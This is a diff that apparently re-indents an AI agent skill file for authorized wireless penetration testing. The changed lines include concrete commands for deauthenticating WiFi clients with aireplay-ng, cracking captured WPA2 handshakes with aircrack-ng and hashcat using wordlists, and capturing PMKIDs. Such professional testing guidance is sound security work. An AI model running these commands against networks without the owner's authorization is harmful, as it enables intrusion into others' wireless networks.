@@ -1,14 +1,14 @@
 ---
 name: conducting-wireless-network-penetration-test
 description: 'Conducts authorized wireless network penetration tests to assess the
-  security of WiFi infrastructure by testing for weak encryption protocols, captive
-  portal bypasses, evil twin attacks, WPA2/WPA3 handshake capture, rogue access point
-  detection, and client-side attacks. The tester evaluates wireless authentication,
-  network segmentation, and the effectiveness of wireless intrusion detection systems.
-  Activates for requests involving wireless pentest, WiFi security assessment, WPA2/WPA3
-  testing, or rogue access point detection.
+ security of WiFi infrastructure by testing for weak encryption protocols, captive
+ portal bypasses, evil twin attacks, WPA2/WPA3 handshake capture, rogue access point
+ detection, and client-side attacks. The tester evaluates wireless authentication,
+ network segmentation, and the effectiveness of wireless intrusion detection systems.
+ Activates for requests involving wireless pentest, WiFi security assessment, WPA2/WPA3
+ testing, or rogue access point detection.
 
-  '
+ '
 domain: cybersecurity
 subdomain: penetration-testing
 tags:
@@ -73,9 +73,9 @@ For WPA2-PSK networks, capture the 4-way handshake and attempt offline cracking:
 - Deauthenticate a connected client to force re-authentication: `aireplay-ng -0 5 -a <bssid> -c <client_mac> wlan0mon`
 - Verify handshake capture in airodump-ng (WPA handshake indicator appears)
 - Crack the captured handshake:
-  - Dictionary attack: `aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap`
-  - GPU-accelerated: `hashcat -m 22000 capture.hc22000 /usr/share/wordlists/rockyou.txt`
-  - Rule-based: `hashcat -m 22000 capture.hc22000 wordlist.txt -r /usr/share/hashcat/rules/best64.rule`
+ - Dictionary attack: `aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap`
+ - GPU-accelerated: `hashcat -m 22000 capture.hc22000 /usr/share/wordlists/rockyou.txt`
+ - Rule-based: `hashcat -m 22000 capture.hc22000 wordlist.txt -r /usr/share/hashcat/rules/best64.rule`
 - For PMKID capture (clientless): `hcxdumptool -i wlan0mon --enable_status=1 -o pmkid.pcapng --filtermode=2 --filterlist_ap=<bssid>`
 
 ### Step 3: WPA2-Enterprise Attack
